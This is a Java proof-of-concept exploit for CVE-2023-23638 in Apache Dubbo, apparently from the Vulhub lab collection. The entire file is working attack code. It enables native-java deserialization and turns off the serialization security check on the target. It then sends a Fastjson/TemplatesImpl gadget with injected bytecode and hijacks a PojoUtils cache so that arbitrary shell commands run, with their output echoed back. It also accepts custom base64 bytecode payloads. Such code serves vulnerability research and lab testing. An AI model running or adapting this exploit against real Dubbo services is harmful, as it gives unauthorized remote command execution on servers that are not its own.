package org.vulhub.poc;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.dubbo.common.io.UnsafeByteArrayOutputStream;
import org.apache.dubbo.common.serialize.ObjectOutput;
import org.apache.dubbo.common.serialize.nativejava.NativeJavaSerialization;
import org.apache.dubbo.common.utils.PojoUtils;
import org.apache.dubbo.config.ApplicationConfig;
import org.apache.dubbo.config.ReferenceConfig;
import org.apache.dubbo.rpc.RpcException;
import org.apache.dubbo.rpc.service.GenericService;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.charset.Charset;
import java.util.Arrays;
import java.util.Base64;
import java.util.Collection;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CVE202323638 {
    private static final String DEFAULT_COMMAND = "touch /tmp/success-cve-2023-23638";
    private static final String METADATA_SERVICE = "org.apache.dubbo.metadata.MetadataService";
    private static final String METADATA_METHOD = "getMetadataInfo";
    private static final String METADATA_VERSION = "1.0.0";
    private static final String ECHO_METHOD = "echo";
    private static final String RAW_GENERIC = "raw.return";
    private static final String NATIVE_JAVA_GENERIC = "nativejava";
    private static final String CMD_PREFIX = "CMD:";
    private static final String CMD_UTF8_PREFIX = "CMD:u";
    private static final String CMD_SPLIT = "@cmdEcho@";
    private static final Pattern EXPORTED_SERVICE_PATTERN = Pattern.compile(
            "Not found exported service: .*?\\[(.*?)\\], may be version"
    );
    private static final Pattern CMD_OUTPUT_PATTERN = Pattern.compile("(?s)@cmdEcho@(.*?)@cmdEcho@");

    private final String host;
    private final int port;
    private final String baseUrl;
    private String targetUrl;
    private String targetInterface = METADATA_SERVICE;
    private String targetMethod = METADATA_METHOD;
    private String targetParameterType = "java.lang.String";
    private String targetVersion = METADATA_VERSION;
    private String targetGroup = "";

    public CVE202323638(String host, int port) {
        this.host = host;
        this.port = port;
        this.baseUrl = "dubbo://" + host + ":" + port + "/";
    }

    public static void main(String[] args) throws Exception {
        String[] positional = PocUtils.positional(args);
        if (positional.length < 2 || positional.length > 3) {
            System.err.println("Usage: CVE-2023-23638 <host> <port> [command]");
            System.err.println("Example: CVE-2023-23638 127.0.0.1 20880 \"touch /tmp/success-cve-2023-23638\"");
            System.exit(1);
        }

        String host = positional[0];
        int port = Integer.parseInt(positional[1]);
        String payloadArgument = positional.length == 3 ? positional[2] : DEFAULT_COMMAND;

        CVE202323638 poc = new CVE202323638(host, port);
        if (payloadArgument.startsWith("yv66vg")) {
            byte[] bytecode = Base64.getDecoder().decode(payloadArgument);
            poc.sendBytecodePayload(bytecode);
            System.out.println("Custom bytecode payload sent to " + host + ":" + port);
            return;
        }

        poc.injectCommandRunner();
        String result = poc.executeCommand(payloadArgument);
        if (result == null) {
            System.out.println("Payload sent to " + host + ":" + port);
        } else if (result.isEmpty()) {
            System.out.println("Command executed with empty output.");
        } else {
            System.out.println(result);
        }
    }

    private void sendBytecodePayload(byte[] bytecode) throws Exception {
        prepareNativeJava();
        sendPoc(nativeJavaPayload(FastjsonGadget.create(bytecode)), NATIVE_JAVA_GENERIC);
    }

    private void injectCommandRunner() throws Exception {
        prepareNativeJava();
        sendPoc(nativeJavaPayload(FastjsonGadget.create(commandRunnerBytecode())), NATIVE_JAVA_GENERIC);
    }

    private String executeCommand(String command) throws Exception {
        HashMap<String, String> map = new HashMap<>();
        map.put("class", CMD_UTF8_PREFIX + command);
        String response = sendPoc(map, RAW_GENERIC);

        Matcher matcher = CMD_OUTPUT_PATTERN.matcher(response);
        if (matcher.find()) {
            return matcher.group(1);
        }

        response = sendPoc(nativeJavaPayload(FastjsonGadget.create(commandEchoBytecode(command))), NATIVE_JAVA_GENERIC);
        matcher = CMD_OUTPUT_PATTERN.matcher(response);
        if (matcher.find()) {
            return matcher.group(1);
        }
        return null;
    }

    private void prepareNativeJava() throws Exception {
        discoverTargetService();
        sendPoc(classMap("java.time.zone.TzdbZoneRulesProvider"), RAW_GENERIC);
        sendPoc(dubboPropertiesMap(), RAW_GENERIC);
    }

    private void discoverTargetService() throws Exception {
        if (targetUrl != null) {
            return;
        }

        sendPoc(null, RAW_GENERIC);
        if (targetUrl == null) {
            targetUrl = baseUrl + METADATA_SERVICE;
        }
    }

    private String sendPoc(Object argument, String generic) throws Exception {
        try {
            GenericService service = genericService(generic);
            Object[] arguments = argument == null && METADATA_METHOD.equals(targetMethod)
                    ? new Object[0]
                    : new Object[]{argument};
            service.$invoke(targetMethod, new String[]{targetParameterType}, arguments);
            return "";
        } catch (RpcException e) {
            String message = e.toString();
            discoverExportedService(message);
            return message;
        } catch (Exception e) {
            return e.toString();
        }
    }

    private GenericService genericService(String generic) {
        String url = targetUrl == null ? baseUrl + METADATA_SERVICE : targetUrl;

        ReferenceConfig<GenericService> reference = new ReferenceConfig<>();
        reference.setRetries(0);
        reference.setCheck(false);
        reference.setApplication(new ApplicationConfig("cve-2023-23638-poc"));
        reference.setInterface(targetInterface);
        reference.setGeneric(generic);
        if (!targetVersion.isEmpty()) {
            reference.setVersion(targetVersion);
        }
        reference.setUrl(url);
        reference.setTimeout(10000);

        if (!targetGroup.isEmpty()) {
            reference.setGroup(targetGroup);
        }

        return reference.get();
    }

    private void discoverExportedService(String message) {
        if (targetUrl != null) {
            return;
        }

        Matcher matcher = EXPORTED_SERVICE_PATTERN.matcher(message);
        if (!matcher.find()) {
            return;
        }

        String[] candidates = matcher.group(1).split(",");
        String fallbackService = null;
        for (String candidate : candidates) {
            String service = candidate.trim();
            if (service.isEmpty()) {
                continue;
            }
            if (fallbackService == null) {
                fallbackService = service;
            }
            if (service.contains(METADATA_SERVICE)) {
                selectService(service, METADATA_METHOD, "java.lang.String", METADATA_VERSION);
                return;
            }
        }

        if (fallbackService != null) {
            selectService(fallbackService, ECHO_METHOD, "java.lang.Object", "");
        }
    }

    private void selectService(String service, String method, String parameterType, String version) {
        String servicePath = servicePath(service);
        int groupSeparator = servicePath.lastIndexOf('/');

        targetUrl = baseUrl + servicePath;
        targetInterface = groupSeparator == -1 ? servicePath : servicePath.substring(groupSeparator + 1);
        targetGroup = groupSeparator == -1 ? "" : servicePath.substring(0, groupSeparator);
        targetMethod = method;
        targetParameterType = parameterType;
        targetVersion = version;
    }

    private static String servicePath(String service) {
        String[] parts = service.split(":");
        if (parts.length >= 3) {
            return String.join(":", Arrays.copyOf(parts, parts.length - 2));
        }
        if (parts.length == 2 && isInteger(parts[1])) {
            return parts[0];
        }
        return service;
    }

    private static boolean isInteger(String value) {
        for (int i = 0; i < value.length(); i++) {
            if (!Character.isDigit(value.charAt(i))) {
                return false;
            }
        }
        return !value.isEmpty();
    }

    private static HashMap<String, String> classMap(String className) {
        HashMap<String, String> map = new HashMap<>();
        map.put("class", className);
        return map;
    }

    private static HashMap<String, Object> dubboPropertiesMap() {
        Properties properties = new Properties();
        properties.setProperty("dubbo.security.serialize.generic.native-java-enable", "true");
        properties.setProperty("serialization.security.check", "false");

        HashMap<String, Object> map = new HashMap<>();
        map.put("class", "org.apache.dubbo.common.utils.ConfigUtils");
        map.put("properties", properties);
        return map;
    }

    private static byte[] nativeJavaPayload(Object object) throws Exception {
        NativeJavaSerialization serialization = new NativeJavaSerialization();
        UnsafeByteArrayOutputStream output = new UnsafeByteArrayOutputStream();
        ObjectOutput objectOutput = serialization.serialize(null, output);
        objectOutput.writeObject(object);
        return output.toByteArray();
    }

    private static byte[] commandRunnerBytecode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(CommandRunner.class));
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass clazz = pool.get(CommandRunner.class.getName());
        clazz.setName("org.vulhub.poc.PojoUtilsCache" + System.nanoTime());
        clazz.getClassFile().setMajorVersion(51);
        return clazz.toBytecode();
    }

    private static byte[] commandEchoBytecode(String command) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(FastjsonGadget.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));

        CtClass clazz = pool.get(FastjsonGadget.StubTransletPayload.class.getName());
        clazz.setName("org.vulhub.poc.CommandEcho" + System.nanoTime());
        clazz.getClassFile().setMajorVersion(51);
        clazz.makeClassInitializer().insertAfter(commandEchoInitializer(command));
        return clazz.toBytecode();
    }

    private static String commandEchoInitializer(String command) {
        return "try {"
                + "StringBuilder out = new StringBuilder(\"" + CMD_SPLIT + "\");"
                + "Process p = java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", \""
                + javaString(command) + "\"});"
                + "java.io.BufferedReader stdout = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));"
                + "String line;"
                + "while ((line = stdout.readLine()) != null) { out.append(line).append('\\n'); }"
                + "java.io.BufferedReader stderr = new java.io.BufferedReader(new java.io.InputStreamReader(p.getErrorStream()));"
                + "while ((line = stderr.readLine()) != null) { out.append(line).append('\\n'); }"
                + "out.append(\"" + CMD_SPLIT + "\");"
                + "throw new java.lang.IllegalArgumentException(out.toString());"
                + "} catch (java.lang.RuntimeException e) { throw e; }"
                + "catch (java.lang.Exception e) { throw new java.lang.RuntimeException(e); }";
    }

    private static String javaString(String value) {
        return value.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r");
    }

    public static class CommandRunner extends AbstractTranslet implements ConcurrentMap<Object, Object> {
        private final ConcurrentHashMap<Object, Object> map = new ConcurrentHashMap<>();

        public CommandRunner() {
            try {
                install();
            } catch (Exception e) {
                // Some affected Dubbo builds use different PojoUtils caches; direct bytecode mode remains available.
            }
        }

        public CommandRunner(String ignored) {
        }

        private static void install() throws Exception {
            Field modifiers = Field.class.getDeclaredField("modifiers");
            modifiers.setAccessible(true);

            Field field = PojoUtils.class.getDeclaredField("CLASS_NOT_FOUND_CACHE");
            field.setAccessible(true);
            modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            field.set(null, new CommandRunner(""));
        }

        @Override
        public boolean containsKey(Object key) {
            String value = String.valueOf(key);
            if (!value.startsWith(CMD_PREFIX)) {
                return map.containsKey(key);
            }

            StringBuilder output = new StringBuilder(CMD_SPLIT);
            try {
                Process process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", value.substring(5)});
                InputStream inputStream = process.getInputStream();
                InputStreamReader reader;
                if (value.charAt(4) == 'g') {
                    reader = new InputStreamReader(inputStream, Charset.forName("GBK"));
                } else {
                    reader = new InputStreamReader(inputStream);
                }

                BufferedReader bufferedReader = new BufferedReader(reader);
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    output.append(line).append('\n');
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

            output.append(CMD_SPLIT);
            throw new IllegalArgumentException(output.toString());
        }

        @Override
        public Object putIfAbsent(Object key, Object value) {
            return map.putIfAbsent(key, value);
        }

        @Override
        public boolean remove(Object key, Object value) {
            return map.remove(key, value);
        }

        @Override
        public boolean replace(Object key, Object oldValue, Object newValue) {
            return map.replace(key, oldValue, newValue);
        }

        @Override
        public Object replace(Object key, Object value) {
            return map.replace(key, value);
        }

        @Override
        public int size() {
            return map.size();
        }

        @Override
        public boolean isEmpty() {
            return map.isEmpty();
        }

        @Override
        public boolean containsValue(Object value) {
            return map.containsValue(value);
        }

        @Override
        public Object get(Object key) {
            return map.get(key);
        }

        @Override
        public Object put(Object key, Object value) {
            return map.put(key, value);
        }

        @Override
        public Object remove(Object key) {
            return map.remove(key);
        }

        @Override
        public void putAll(Map<?, ?> values) {
            map.putAll(values);
        }

        @Override
        public void clear() {
            map.clear();
        }

        @Override
        public Set<Object> keySet() {
            return map.keySet();
        }

        @Override
        public Collection<Object> values() {
            return map.values();
        }

        @Override
        public Set<Entry<Object, Object>> entrySet() {
            return map.entrySet();
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
                throws TransletException {
        }

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }
    }
}
